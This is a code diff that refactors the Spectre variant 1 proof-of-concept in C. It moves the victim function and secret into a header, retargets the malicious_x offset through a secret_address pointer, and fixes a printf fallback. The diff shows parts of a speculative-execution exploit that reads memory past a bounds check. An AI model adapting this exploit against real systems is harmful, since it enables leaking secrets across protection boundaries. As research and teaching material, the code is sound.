@@ -8,41 +8,7 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-/********************************************************************
-Victim code.
-********************************************************************/
-unsigned int array1_size = 16;
-uint8_t unused1[64];
-uint8_t array1[160] = {
-  1,
-  2,
-  3,
-  4,
-  5,
-  6,
-  7,
-  8,
-  9,
-  10,
-  11,
-  12,
-  13,
-  14,
-  15,
-  16
-};
-uint8_t unused2[64];
-uint8_t array2[256 * 512];
-
-char * secret = "The Magic Words are Squeamish Ossifrage.";
-
-uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
-
-void victim_function(size_t x) {
-  if (x < array1_size) {
-    temp &= array2[array1[x] * 512];
-  }
-}
+#include "victim.h"
 
 /********************************************************************
 Analysis code
@@ -115,7 +81,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 int main(int argc,
   const char * * argv) {
-  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
+  size_t malicious_x = (size_t)(*(char **)secret_address - (char * ) array1); /* default for malicious_x */
   int i, score[2], len = 40;
   uint8_t value[2];
 
@@ -133,10 +99,11 @@ int main(int argc,
     readMemoryByte(malicious_x++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
+      (value[0] > 31 && value[0] < 127 ? value[0] : '\0'), score[0]);
     if (score[1] > 0)
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
   }
+
   return (0);
 }
